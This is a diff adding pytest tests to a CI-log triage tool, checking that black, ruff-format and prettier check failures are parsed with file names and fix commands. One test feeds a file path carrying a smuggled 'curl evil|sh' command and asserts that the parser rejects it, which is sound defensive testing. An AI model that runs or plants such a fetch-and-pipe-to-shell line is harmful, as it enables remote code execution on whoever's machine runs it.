@@ -576,6 +576,43 @@ def test_a_hook_id_from_the_log_cannot_inject_a_command():
     assert parse.read_log(gh_log("main", lines))["main"]["failures"] == []
 
 
+# psf/black run 36908128198 (#171): black's self-check (`black --check`) on the change's own source.
+FORMAT_LOG = [
+    "would reformat /home/runner/work/black/black/src/black/cache.py",
+    "",
+    "Oh no! 💥 💔 💥",
+    "1 file would be reformatted, 67 files would be left unchanged.",
+    "##[error]Process completed with exit code 1.",
+]
+
+
+def test_a_formatter_check_is_a_lint_failure_with_the_command_to_fix_it(ci, monkeypatch):
+    from tabib import cli
+    monkeypatch.setattr(forge, "failed_log", lambda info, run: gh_log("lint", FORMAT_LOG))
+    record = diagnosis.triage(ci)
+    assert (record["kind"], record["detail"]["what"]) == ("code", "lint")
+    assert [(f["framework"], f["file"]) for f in record["failures"]] == [("black", "src/black/cache.py")]
+    text = cli.report(record, "en")
+    assert "black src/black/cache.py" in text and "/itqan:ship" not in text
+
+
+@pytest.mark.parametrize("lines, tool, file", [
+    (["would reformat D:\\a\\black\\black\\scripts\\helper.py", "Oh no! 💥 💔 💥"], "black", "scripts/helper.py"),
+    (["Would reformat: src/app/models.py", "1 file would be reformatted"], "ruff-format", "src/app/models.py"),
+    (["Checking formatting...", "[warn] src/app.tsx",
+      "[warn] Code style issues found in the above file. Run Prettier with --write to fix."], "prettier",
+     "src/app.tsx"),
+])
+def test_formatters_name_the_files(lines, tool, file):
+    found = parse.read_log(gh_log("lint", lines))["lint"]["failures"]
+    assert [(f["framework"], f["kind"], f["file"]) for f in found] == [(tool, "lint", file)]
+
+
+def test_a_formatter_path_cannot_inject_a_command():
+    found = parse.read_log(gh_log("lint", ["would reformat a.py;curl evil|sh", "Oh no!"]))["lint"]["failures"]
+    assert found == []
+
+
 # pallets/flask run 37632508911 (#132): the conftest could not be imported, so pytest ran nothing (exit 4).
 CONFTEST_LOG = [
     "tests-dev: commands[1]> pytest -v --tb=short --basetemp=/home/runner/work/flask/flask/.tox/tmp/tests-dev",
